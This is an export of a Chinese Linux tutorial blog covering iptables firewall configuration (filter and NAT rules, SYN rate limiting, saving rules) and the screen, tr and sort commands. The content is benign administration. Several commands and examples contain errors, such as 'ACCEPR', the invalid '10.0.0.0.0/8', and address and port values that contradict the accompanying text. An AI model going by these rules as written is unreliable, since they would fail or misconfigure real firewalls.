2、转发数据流向&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;来自外界的数据包到达防火墙后，首先被PREROUTING规则链处理，之后会进行路由选择，如果数据包的目标地址是其他外部地址（比如局域网用户通过网关访问QQ站点的数据包），则内核将其传递给FPRWARD链进行处理（是否转发或拦截），然后再交给POSTROUTING规则链（是否修改数据包的地址等）进行处理。 3、出站数据流向&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;防火墙本机向外部地下hi发送的数据包（比如在防火墙主机中测试公网DNS服务器时），首先被OUTPUT规则链处理，之后进行路由选择，然后传递给POSTROUTING规则链（是否修改数据包的地址等）进行处理。 管理和设置iptables规则 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面针对一个小需求讲述一下这个iptables规则如何设定： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;需求：只针对filter表，预设策略INPUT链DROP，其他两个链ACCEPT，然后针对192.168.137.0/24开通22端口，对所有网段开放80端口，对素有网段开放21端口。这个需求不复制，但是有很多条规则，所以最好写成脚本形式： 123456789101112[root@localhost ~]# vim /usr/local/sbin/iptables.sh#!/bin/bashipt="/sbin/iptables"$ipt -F$ipt -P INPUT DROP$ipt -P OUTPUT ACCEPT$ipt -P FORWARD ACCEPR$ipt -A INPUT -s 192.168.137.0/24 -p tcp --dport 22 -j ACCEPT$ipt -A INPUT -p tcp --dport 80 -j ACCEPT$ipt -A INPUT -p tcp --dport 21 -j ACCEPT &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;完成脚本编写后，直接运行即可。如果想开机启动时初始化防火墙规则，需要在 /etc/rc.d/rc.local 中添加一行 /bin/bash /usr/local/sbin/iptables.sh 1234567[root@localhost ~]# sh /usr/local/sbin/iptables.sh[root@localhost ~]# iptables -nvLChain INPUT (policy DROP 0 packets, 0 bytes) pkts bytes target prot opt in out source destination 20 1580 ACCEPT tcp -- * * 192.168.137.0/24 0.0.0.0/0 tcp dpt:22 0 0 ACCEPT tcp -- * * 0.0.0.0/0 0.0.0.0/0 tcp dpt:80 0 0 ACCEPT tcp -- * * 0.0.0.0/0 0.0.0.0/0 tcp dpt:21 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;运行脚本后，查看规则就是这样的，可以看到第一条规则中已经有20个包被放行了。关于icmp的包有一个比较常见的应用： 1root@localhost ~]# iptables -I INPUT -p icmp --icmp-type 8 -j DROP &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; –icmp-type 这个选项是要跟 -p icmp 一起使用的，后i安指定类型编号。这个8指的是能在本机ping同其他机器，而其他机器不能ping通本机。 nat表的应用&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其实，linux的iptables功能是十分强大的，曾经有一个老师这样形容Linux的网络功能：只有想不到，没有做不到！也就是说只要能够想到的关于网络的应用，Linux都能实现。在日常生活中使用的路由器，它的功能就是分享上网。本来一跟网线过来（其实只有一个公网IP），通过路由器后，路由器分配了一个网段（私网IP），这样连接路由器的台机器都能连接internet，而远端的设备认为IP就是那个连接路由器的公网IP。这个路由器的功能其实就是有Linux的iptables实现的，而iptables又是通过nat表作用而实现的这个功能。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;举个例子来说明iptables如何实现的这个功能。假设机器上有两块网卡etho0和eth1，其中eth0的IP为10.0.2.68，eth1的IP为192.168.1.1.eth0连接了internet，但eth1没有连接，现在有另一台机器（192.168.1.2）和eth1是互通的，那么如何设置也能够让连接eth1的这台机器能够连接internet（即能和10.0.2.68互通）？ 12[root@localhost ~]# echo "1" &gt; /proc/sys/net/ipv4/ip_forward[root@localhost ~]# iptables -t nat -A POSTROUTING -s 192.168.1.0/24 -o eth0 -j MASQUERADE &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;就是这样简单的两条命令就能实现上面的需求。第一个命令涉及到了内核参数相关的配置文件，它的目的是为了打开路由转发功能，否则无法实现应用。第二个命令则是iptables对nat表做了一个IP转发的操作，-o选项后跟设备名，表示出口的网卡，MASQUERADE表示伪装的意思。 iptables防火墙规则的保存与恢复&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;iptables-save把规则保存到文件中，再由目录rc.d下个脚本（/etc/rc.d/init.d/iptables）自动装载 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用命令iptables-save来保存规则。一般用 1iptables-save &gt; /etc/sysconfig/iptables &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;生成保存规则的文件/etc/sysconfig/iptables, &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;也可以用 1service iptables save &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;它能把规则自动保存在/etc/sysconfig/iptables中。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当计算机启动时，rc.d下的脚本将用命令iptables-restore调用这个文件，从而就自动恢复了规则。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-nvL就是查看规则，-F是把当前规则清除，但这个只是临时的，重启系统或者重启iptables服务后还回加载已经保存的规则，所以需要使用/etc/init.d/iptables save保存一下规则 1iptables -F ; /etc/init.d/iptables save 使用实例实例1：查看规则以及清除规则&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1iptables -t nat -nvL &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789[root@localhost ~]# iptables -t nat -nvLChain PREROUTING (policy ACCEPT 0 packets, 0 bytes) pkts bytes target prot opt in out source destination Chain POSTROUTING (policy ACCEPT 0 packets, 0 bytes) pkts bytes target prot opt in out source destination Chain OUTPUT (policy ACCEPT 0 packets, 0 bytes) pkts bytes target prot opt in out source destination &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-t后面跟表名，-nvL即查看该表的规则，其中-n表示不针对IP反解析主机名；-L表示列出的意思；而-v表示列出的信息更加详细。。如果不加-t，则打印filter表的相关信息： 123456789[root@localhost ~]# iptables -nvLChain INPUT (policy ACCEPT 121 packets, 9013 bytes) pkts bytes target prot opt in out source destination Chain FORWARD (policy ACCEPT 0 packets, 0 bytes) pkts bytes target prot opt in out source destination Chain OUTPUT (policy ACCEPT 85 packets, 8828 bytes) pkts bytes target prot opt in out source destination &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个和-t filter打印的信息是一样的。 实例2：清除iptables规则&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 12iptables -Fiptables -Z &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;不加-t默认是针对表filter来操作的，-F表示把所有规则全部删除；-Z表示把包以及流量计数器清零。 实例3：增加一条规则1[root@localhost ~]# iptables -A INPUT -s 10.72.11.12 -p tcp --sport 1234 -d 10.72.137.159 --dport 80 -j DROP &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这就是增加一条规则，省略-t所以针对filter表。-A表示增加一条规则，另外还有-I表示插入一条规则，-D删除一条规则；后面个INPUT既链名称，还可以是OUTPUT或者FORWARD；-s后跟源地址；-p协议（tcp、udp、icmp）；--sport/--dport后跟源端口；-d后跟目的IP（主要针对内网或者外网）；-j后跟动作（DROP即把包丢掉，REJECT即包拒绝；ACCEPT即允许包）。 实例4：插入一条规则，把来自1.1.1.1的所有数据包丢掉&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1[root@localhost ~]# iptables -I INPUT -s 1.1.1.1 -j DROP 实例5：删除一条规则&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1[root@localhost ~]# iptables -D INPUT -s 1.1.1.1 -j DROP &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;删除实例4中插入的规则。注意要删除一条规则时，必须和插入的规则一致，也就是说两条iptables命令，除了-I和-D不一样外，其他地方都一样 实例6：把来自2.2.2.2并且是tcp协议到本机80端口的数据包球吊&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1[root@localhost ~]# iptables -I INPUT -s 2.2.2.2 -p tcp --dport 80 -j DROP &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;要注意的是--dport/--sport必须要和-p选项一起使用，否则会出错。 实例7：把发送到10.0.1.14的22端口的数据包丢掉&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1[root@localhost ~]# iptables -I OUTPUT -p tcp --dport 22 -d 10.0.1.14 -j DROP 实例8：把来自192.168.0.0/24这个网段的并且作用在eth0上的数据包都放行&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 123[root@localhost ~]# iptables -A INPUT -s 192.168.0.0/24 -i eth0 -j ACCEPT[root@localhost ~]# iptables -nvL | grep '192.168.0.0/24' 65 4680 ACCEPT all -- eth0 * 192.168.0.0/24 0.0.0.0/0 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-I 和 -A 都是增加规则，它们的去区别是。 -A 可以说是往后排，-I 是直接插队到最前面。也就是说 -A 增加的规则是在最后面的，而 -I 增加的规则是在最前面的。数据包流向是从前往后走，所以如果想让一条规则最优先生效，那么就用 -I 插入一条规则。 实例9：iptables删除某一条规则&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;iptables过多了，想删除某一条规则时，又不容易掌握当时创建时的规则。其实有一种比较简单的方法: 123456789101112[root@localhost ~]# iptables -nvL --line-numbersChain INPUT (policy ACCEPT 12 packets, 648 bytes)num pkts bytes target prot opt in out source destination 1 0 0 DROP tcp -- * * 2.2.2.2 0.0.0.0/0 tcp dpt:80 2 132 9309 ACCEPT all -- eth0 * 192.168.0.0/24 0.0.0.0/0 Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)num pkts bytes target prot opt in out source destination Chain OUTPUT (policy ACCEPT 90 packets, 8816 bytes)num pkts bytes target prot opt in out source destination 1 0 0 DROP tcp -- * * 0.0.0.0/0 10.0.1.14 tcp dpt:22 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;删除某一条规则使用如下命令： 1[root@localhost ~]# iptables -D INPUT 2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-D后跟链名，然后是规则num，这个num就是查看iptables规则时第一列的值。再次查看刚才的规则，INPUT里已经没有第2条了 1234567891011[root@localhost ~]# iptables -nvL --line-numbersChain INPUT (policy ACCEPT 7 packets, 504 bytes)num pkts bytes target prot opt in out source destination 1 0 0 DROP tcp -- * * 2.2.2.2 0.0.0.0/0 tcp dpt:80 Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)num pkts bytes target prot opt in out source destination Chain OUTPUT (policy ACCEPT 5 packets, 604 bytes)num pkts bytes target prot opt in out source destination 1 0 0 DROP tcp -- * * 0.0.0.0/0 10.0.1.14 tcp dpt:22 实例10：接收目标端口为22的数据包&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1iptables -A INPUT -i eth0 -p tcp --dport 22 -j ACCEPT 实例11：拒绝所有其他数据包&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1iptables -A INPUT -j DROP 实例12：iptables -P选项&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1root@localhost ~]# iptables -P INPUT DROP &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-P选项经常用到，表示预设策略。 -P 后面跟链名，策略内容或者为DROP或者为ACCEPT，默认是ACCEPT。注意：如果在连接远程服务器，千万不要随便敲这个命令，因为一旦钓完回车就会断掉。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 这个策略一旦设定后，只能使用 iptables -P INPUT ACCEPT 才能恢复成原始状态，而不能使用-F参数。 实例13：iptables实现内网机器访问外网&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;环境：两台机器，一台可以访问外网、内网，一台只能访问内网 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;外网机器的外网IP：123.221.20.11；内网IP为：192.168.15.100 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;内网机器IP：192.168.15.101&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;设置方法： 在外网机器上设置iptables规则： 1[root@localhost ~]# iptables -t nat -A POSTROUTING -s 192.168.15.101 -j SNAT --to 123.221.20.11 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 注意 :如果想让整个内网的机器全部上网，只需要把 -s 192.168.15.101 换成 -s 192.168.15.0/255.255.255.0 即可 在带外网机器上打开转发&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先查看是否已经打开 1[root@localhost ~]# sysctl -a | grep 'net.ipv4.ip_forward' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果值为1，则说明已经打开，否则需要修改匹配文件 /etc/sysctl.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;打开该配置文件，找到该参数，使其变为 1net.ipv4.ip_forward = 1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后运行 1sysctl -p 在内网机器上，设置其网关为 192.168.15.100 123[root@localhost ~]# vim /etc/sysconfig/network-scripts/ifcfg-eth0 GATEWAY=192.168.15.100 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;重启网络服务即可 1service network restart 测试内网机器是否可以上网 实例14：iptables限制syn速度&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 原理 ：每5s内tcp三次握手大于20次的属于不正常访问。 12[root@localhost ~]# iptables -A INPUT -s ! 192.168.0.0/255.255.255.0 -d 192.168.0.101 -p tcp -m tcp --dport 80 -m state --state NEW -m recent --set --name httpuser --rsource[root@localhost ~]# iptables -A INPUT -m recent --update --seconds 5 --hitcount 20 --name httpuser --rsource -j DROP &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中192.168.0.0/255.255.255.0为不受限制的网段，192.168.0.101 为本机IP。该iptables策略，可有效预防syn攻击，也可以有效防止机器人发垃圾贴。 实例15：拒绝进入防火墙的所有ICMP协议数据包1iptables -I INPUT -p icmp -j REJECT 实例16:允许防火墙转发除ICMP协议以外的所有数据包1iptables -A FORWARD -p ! icmp -j ACCEPT &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 说明 ：使用“!”可以将条件取反 实例17：拒绝转发来自192.168.1.10主机的数据，允许转发来自192.168.0.0/24网段的数据12iptables -A FORWARD -s 192.168.1.11 -j REJECTiptables -A FORWARD -s 192.168.0.0/24 -j ACCEPT &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 说明 ：注意要把拒绝的放在前面，不然就不起作用了。 实例18：丢弃从外网接口（eth1）进入防火墙本机的源地址为私网地址的数据包123iptables -A INPUT -i eth1 -s 192.168.0.0/16 -j DROPiptables -A INPUT -i eth1 -s 172.16.0.0/12 -j DROPiptables -A INPUT -i eth1 -s 10.0.0.0.0/8 -j DROP 实例19：封堵网段（192.168.1.0/24），两小时后解封123iptables -I INPUT -s 10.20.30.0/24 -j DROPiptables -I FORWARD -s 10.20.30.0/24 -j DROPat now 2 hours at&gt; iptables -D INPUT 1 at&gt; iptables -D FORWARD 1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 说明 ：这个策略借助crontab计划任务来完成，就再好不过了。 1[1] Stopped at now 2 hours 实例20：只允许管理员从202.13.0.0/16网段使用SSH远程登录防火墙主机12iptables -A INPUT -p tcp --dport 22 -s 202.13.0.0/16 -j ACCEPTiptables -A INPUT -p tcp --dport 22 -j DROP &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 说明 ：这个用法比较适合对设备进行远程管理时使用，比如位于分公司中的SQL服务器需要被总公司的管理员管理时。 实例21：允许本机开放从TCP端口20-1024提供的应用服务12iptables -A INPUT -p tcp --dport 20:1024 -j ACCEPTiptables -A INPUT -p tcp --sport 20:1024 -j ACCEPT 实例22：允许转发来自192.168.0.0/24局域网的DNS解析请求数据包12iptables -A FORWARD -s 192.168.0.0/24 -p udp --dport 53 -j ACCEPTiptables -A FORWARD -s 192.168.0.0/24 -p udp --sport 53 -j ACCEPT 实例23：禁止其他主机ping防火墙主机，但是允许防火墙上ping其他主机123iptables -I INPUT -p icmp --icmp-type Echo-Request -j DROPiptables -I INPUT -p icmp --icmp-type Echo-Reply -j ACCEPTiptables -I INPUT -p icmp --icmp-type destination-Unreachable -j ACCEPT 实例24：禁止转发来自MAC地址为00:0C:29:27:55:3F的和主机的数据包1iptables -A FORWARD -m mac --mac-source 00:0c:29:27:55:3f -j DROP &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 说明 :iptables中使用 -m 模块关键字 的形式调用显示匹配。这里用 -m mac --mac-source来表示数据包的源MAC地址。 实例25：允许防火墙本机对外开放TCP端口 20、21、25、110以及被动模式FTP端口1250-12801iptables -A INPUT -p tcp -m multiport --dport 20,21,25,110,1250:1280 -j ACCEPT &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 说明 ：这里使用 -m multiport -dport 来指定目的端口及范围 实例26：禁止转发源IP地址为192.168.1.20-192.168.1.99的TCP数据包1iptables -A FORWARD -p tcp -m iprange --src-range 192.168.1.20-192.168.1.99 -j DROP &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 说明 ：此处用 -m -iprange --src-range指定IP范围 实例27：禁止转发与正常TCP连接无关的非-syn请求数据包1iptables -A FORWARD -m state --state NEW -p tcp ! --syn -j DROP &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 说明 ：-m state 表示数据包的俩节状态，NEW表示与任何 连接无关的，新的嘛！ 实例28：拒绝访问防火墙的新数据包，但允许响应连接或与已有连接相关的数据包12iptables -A INPUT -p tcp -m state --state NEW -j DROPiptables -A INPUT -p tcp -m state --state ESTABLISHED,RELATED -j ACCEPT &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 说明 ：ESTABLISHED 表示已经响应请求或者已经建立连接的数据包，RELATED 表示与已建立的连接有相关性的，比如FTP数据连接等。 实例29：只开放本机的web服务（80）、FTP（20、21、20340-20480），放行外部主机发往服务器其他端口的应答数据包，将其他入站数据包均以丢弃处理1234iptables -I INPUT -p tcp -m multiport --dport 20,21,80 -j ACCEPTiptables -I INPUT -p tcp --dport 2045:20480 -j ACCEPTiptables -I INPUT -p tcp -m state --state ESTABLISHED -j ACCEPTiptables -P INPUT DROP]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- screen]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F82.%20Linux%20%E5%91%BD%E4%BB%A4-%20screen%2F</url>
    <content type="text"><![CDATA[Linux 命令- screen&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;screen命令用于多重视窗管理程序。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;screen为多重视窗管理程序。所谓的视窗，是指一个全屏幕的文字模式画面。通常只有在使用telnet登入主机或是使用老式终端机时，才有可能用到screen程序。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有时候，也许会有这样的需求。要执行一个命令或者脚本，但是需要几个小时甚至几天。这就要考虑一个问题，就是中途断网或出现其他意外情况，执行的任务中断了怎么办？可以把命令或者脚本丢到后台运行，不过也不保险。screen可以避免这样的问题发生。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;screen中有会话的概念，用户可以在一个screen会话中创建多个screen窗口，在每一个窗口中就想操作一个真实的SSH连接窗口那样。 命令语法1screen [-AmRvx -ls -wipe][-d &lt;作业名称&gt;][-h &lt;行数&gt;][-r &lt;作业名称&gt;][-s &lt;shell&gt;][-S &lt;作业名称&gt;] 命令参数 -A 将所有的视窗都调整为目前终端机的大小。 -d&lt;作业名称&gt; 将指定的screen作业离线。 -h&lt;行数&gt; 指定视窗的缓冲区行数。 -m 即使目前已在作业中的screen作业，仍强制建立新的screen作业。 -r&lt;作业名称&gt; 恢复离线的screen作业。 -R 先试图恢复离线的作业。若找不到离线的作业，即建立新的screen作业。 -s 指定建立新视窗时，所要执行的shell。 -S&lt;作业名称&gt; 指定screen作业的名称。 -v 显示版本信息。 -x 恢复之前离线的screen作业。 -ls或–list 显示目前所有的screen作业。 -wipe 检查目前所有的screen作业，并删除已经无法使用的screen作业。 命令实例&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果没有screen命令需先安装 1yum install -y screen &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;创建screen终端 1[root@localhost ~]# screen &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;创建 screen 终端 ，并执行 vi命令 12345678910[root@localhost ~]# screen vi ~/main.c #include main ()&#123;&#125;"~/mail.c" 0,0-1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; Ctrl+a 再按d键，退出该screen回话，只是退出，并没有结束。需要结束的话输入 Ctrl+d 或者输入 exit &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; screen -ls 查看已经打开的screen会话 123[root@localhost ~]# screen -lsThere is a screen on:20001.pts-0.localhost (Attached) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;退出后还想再次登录某个screen会话，使用 sreen -r [screen编号] ，这个编号就是上例中那个20001.当只有一个screen会话时，后面的编号是可以省略的。当有某个需要长时间运行的命令或者脚本时就打开一个screen会话，然后运行该任务。按 ctrl+a d退出会话，不影响终端窗口上的任何操作。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;创建新的screen是可以指定自定义名称的 1[root@localhost ~]# screen -S yanyi &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;要想进入该screen，可以直接 1screen -r yanyi screen源码编译安装12345678[root@host1 src]# wget ftp://ftp.gnu.org/pub/gnu/screen/screen-4.0.3.tar.gz[root@host1 src]# tar -xvf screen-4.0.3.tar.gz[root@host1 src]# cd screen-4.0.3[root@host1 screen-4.0.2]# ./configure[root@host1 screen-4.0.2]# make[root@host1 screen-4.0.2]# make install[root@host1 screen-4.0.2]# install -m 644 etc/etcscreenrc /etc/screenrc[root@host1 screen-4.0.2]# cp ./screen /bin &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意和一般程序的安装过程有所不同，后面两条命令一定要执行。]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- tr]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F68.%20Linux%20%E5%91%BD%E4%BB%A4-%20tr%2F</url>
    <content type="text"><![CDATA[Linux 命令- tr&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;tr 命令用户转换或删除文件中的字符。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;tr 指令从标准输入设备读取数据，经过字符串转以后，将结果输出到标准输出设备。 1. 命令语法12tr [参数] [第一字符集] [第二字符集]tr [OPTION] [SET1] [SET2] 2. 命令参数 -c, –complement：反选设定字符。也就是符合 SET1 的部份不做处理，不符合的剩余部份才进行转换 -d, –delete：删除指令字符 -s, –squeeze-repeats：缩减连续重复的字符成指定的单个字符 -t, –truncate-set1：削减 SET1 指定范围，使之与 SET2 设定长度相等 –help：显示程序用法信息 –version：显示程序本身的版本信息 字符集合的范围： \NNN 八进制值的字符 NNN (1 to 3 为八进制值的字符) \\ 反斜杠 \a Ctrl-G 铃声 \b Ctrl-H 退格符 \f Ctrl-L 走行换页 \n Ctrl-J 新行 \r Ctrl-M 回车 \t Ctrl-I tab键 \v Ctrl-X 水平制表符 CHAR1-CHAR2 ：字符范围从 CHAR1 到 CHAR2 的指定，范围的指定以 ASCII 码的次序为基础，只能由小到大，不能由大到小。 [CHAR*] ：这是 SET2 专用的设定，功能是重复指定的字符到与 SET1 相同长度为止 [CHAR*REPEAT] ：这也是 SET2 专用的设定，功能是重复指定的字符到设定的 REPEAT 次数为止(REPEAT 的数字采 8 进位制计算，以 0 为开始) [:alnum:] ：所有字母字符与数字 [:alpha:] ：所有字母字符 [:blank:] ：所有水平空格 [:cntrl:] ：所有控制字符 [:digit:] ：所有数字 [:graph:] ：所有可打印的字符(不包含空格符) [:lower:] ：所有小写字母 [:print:] ：所有可打印的字符(包含空格符) [:punct:] ：所有标点字符 [:space:] ：所有水平与垂直空格符 [:upper:] ：所有大写字母 [:xdigit:] ：所有 16 进位制的数字 [=CHAR=] ：所有符合指定的字符(等号里的 CHAR，代表你可自订的字符) 使用实例实例1：将文件testfile 中的小写字母全部转换成大写字母&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1cat testfile|tr a-z A-Z &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122$ cat testfile #testfile原来的内容 Linux networks are becoming more and more common, but scurity is often an overlooked issue. Unfortunately, in today’s environment all networks are potential hacker targets, fro0m tp-secret military research networks to small home LANs. Linux Network Securty focuses on securing Linux in a networked environment, where the security of the entire network needs to be consideredrather than just isolated machines. It uses a mix of theory and practicl techniques to teach administrators how to install and use security applications, as well as how the applcations work and why they are necesary. $ cat testfile | tr a-z A-Z #转换后的输出 LINUX NETWORKS ARE BECOMING MORE AND MORE COMMON, BUT SCURITY IS OFTEN AN OVERLOOKED ISSUE. UNFORTUNATELY, IN TODAY’S ENVIRONMENT ALL NETWORKS ARE POTENTIAL HACKER TARGETS, FROM TP-SECRET MILITARY RESEARCH NETWORKS TO SMALL HOME LANS. LINUX NETWORK SECURTY FOCUSES ON SECURING LINUX IN A NETWORKED ENVIRONMENT, WHERE THE SECURITY OF THE ENTIRE NETWORK NEEDS TO BE CONSIDERED RATHER THAN JUST ISOLATED MACHINES. IT USES A MIX OF THEORY AND PRACTICL TECHNIQUES TO TEACH ADMINISTRATORS HOW TO INSTALL AND USE SECURITY APPLICATIONS, AS WELL AS HOW THE APPLCATIONS WORK AND WHY THEY ARE NECESARY. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;也可以使用 [:lower:] [:upper:] 参数来实现 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1cat testfile|tr [:lower:] [:upper:] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678$ cat testfile | tr [:lower:] [:upper:] #转换后的输出 LINUX NETWORKS ARE BECOMING MORE AND MORE COMMON, BUT SCURITY IS OFTEN AN OVERLOOKED ISSUE. UNFORTUNATELY, IN TODAY’S ENVIRONMENT ALL NETWORKS ARE POTENTIAL HACKER TARGETS, FROM TP-SECRET MILITARY RESEARCH NETWORKS TO SMALL HOME LANS. LINUX NETWORK SECURTY FOCUSES ON SECURING LINUX IN A NETWORKED ENVIRONMENT, WHERE THE SECURITY OF THE ENTIRE NETWORK NEEDS TO BE CONSIDERED RATHER THAN JUST ISOLATED MACHINES. IT USES A MIX OF THEORY AND PRACTICL TECHNIQUES TO TEACH ADMINISTRATORS HOW TO INSTALL AND USE SECURITY APPLICATIONS, AS WELL AS HOW THE APPLCATIONS WORK AND WHY THEY ARE NECESARY. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;不过替换、删除、以及去重复都是针对一个字符来讲的，哟一定局限性。如果是针对一个字符串就不再管用了]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- sort]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F65.%20Linux%20%E5%91%BD%E4%BB%A4-%20sort%2F</url>
    <content type="text"><![CDATA[Linux 命令- sort&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;sort 命令在 linux 里非常有用，它将文件进行排序，并将排序结果标准输出。 1. 命令语法1sort [参数] [文件] 2. 命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用作排序 3. 命令参数 -b 忽略每行前面开始出的空格字符。 -d 排序时，处理英文字母、数字及空格字符外，忽略其他的字符。 -f 排序时，将小写字母视为大写字母。 -i 排序时，除了040至176之间的ASCII字符外，忽略其他的字符。 -c 检查文件是否已经按照顺序排序。 -m 将几个排序好的文件进行合并。 -M 前面3个字母依照月份的缩写进行排序。 -n 依照数值的大小排序。 -o&lt;输出文件&gt; 将排序后的结果存入指定的文件。 -r 以相反的顺序来排序。 -t&lt;分隔字符&gt; 指定排序时所用的栏位分隔字符。 -k 指定域 –help 显示帮助。 –version 显示版本信息。 使用实例实例1：对 /etc/passwd 的帐号进行排序&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1cat /etc/passwd|sort &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122[root@localhost ~]# cat /etc/passwd|sortadm:x:3:4:adm:/var/adm:/sbin/nologinbin:x:1:1:bin:/bin:/sbin/nologinchrony:x:997:995::/var/lib/chrony:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologindbus:x:81:81:System message bus:/:/sbin/nologinftp:x:14:50:FTP User:/var/ftp:/sbin/nologingames:x:12:100:games:/usr/games:/sbin/nologinhalt:x:7:0:halt:/sbin:/sbin/haltlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinmail:x:8:12:mail:/var/spool/mail:/sbin/nologinnobody:x:99:99:Nobody:/:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologinpolkitd:x:998:996:User for polkitd:/:/sbin/nologinpostfix:x:89:89::/var/spool/postfix:/sbin/nologinroot:x:0:0:root:/root:/bin/bashshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownsshd:x:74:74:Privilege-separated 